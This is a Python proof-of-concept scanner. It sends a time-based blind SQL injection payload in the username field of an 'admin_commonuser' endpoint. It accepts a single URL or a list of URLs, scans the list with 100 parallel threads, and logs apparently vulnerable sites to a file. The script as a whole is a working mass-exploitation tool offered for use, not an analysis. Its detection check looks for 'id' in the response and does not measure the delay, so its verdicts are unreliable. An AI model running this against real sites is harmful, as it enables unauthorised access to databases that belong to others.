import requests, argparse, re, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

 ██░ ██  █     █░     ██████   █████   ██▓        ▄▄▄▄ ▓██   ██▓    ██▓███   ██▓▓█████ 
▓██░ ██▒▓█░ █ ░█░   ▒██    ▒ ▒██▓  ██▒▓██▒       ▓█████▄▒██  ██▒   ▓██░  ██▒▓██▒▓█   ▀ 
▒██▀▀██░▒█░ █ ░█    ░ ▓██▄   ▒██▒  ██░▒██░       ▒██▒ ▄██▒██ ██░   ▓██░ ██▓▒▒██▒▒███   
░▓█ ░██ ░█░ █ ░█      ▒   ██▒░██  █▀ ░▒██░       ▒██░█▀  ░ ▐██▓░   ▒██▄█▓▒ ▒░██░▒▓█  ▄ 
░▓█▒░██▓░░██▒██▓    ▒██████▒▒░▒███▒█▄ ░██████▒   ░▓█  ▀█▓░ ██▒▓░   ▒██▒ ░  ░░██░░▒████▒
 ▒ ░░▒░▒░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░   ░▒▓███▀▒ ██▒▒▒    ▒▓▒░ ░  ░░▓  ░░ ▒░ ░
 ▒ ░▒░ ░  ▒ ░ ░     ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░   ▒░▒   ░▓██ ░▒░    ░▒ ░      ▒ ░ ░ ░  ░
 ░  ░░ ░  ░   ░     ░  ░  ░     ░   ░   ░ ░       ░    ░▒ ▒ ░░     ░░        ▒ ░   ░   
 ░  ░  ░    ░             ░      ░        ░  ░    ░     ░ ░                  ░     ░  ░
                                                       ░░ ░                            

                                                                @author: black apple pie
                                                                @version: 0.0.1
"""
    print(banner)

#poc
def poc(target):
    url = target + "/admin.php?controller=admin_commonuser"
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
    }
    data = {
        "username":"admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    }
    res = requests.post(url=url, data=data, headers=headers, verify=False, timeout=5)

    try:
        if 'id' in res.text:
            print("[+]" + target + "存在SQL注入")
            with open('SQL.txt', 'a', encoding='utf-8') as f:
                f.write(target + "存在SQL注入")
        else:
            print("[-]" + target + "不存在SQL注入")
    except Exception as e:
        print(e)

#main
def main():
    banner()

    parser = argparse.ArgumentParser(description='this is a canal pass poc')

    #添加参数
    parser.add_argument('-u', '--url', dest='url', help='input attack url', type=str)
    parser.add_argument('-f', '--file', dest='file', help='url.txt', type=str)

    #调用
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


#调用
if __name__ == '__main__':
    main()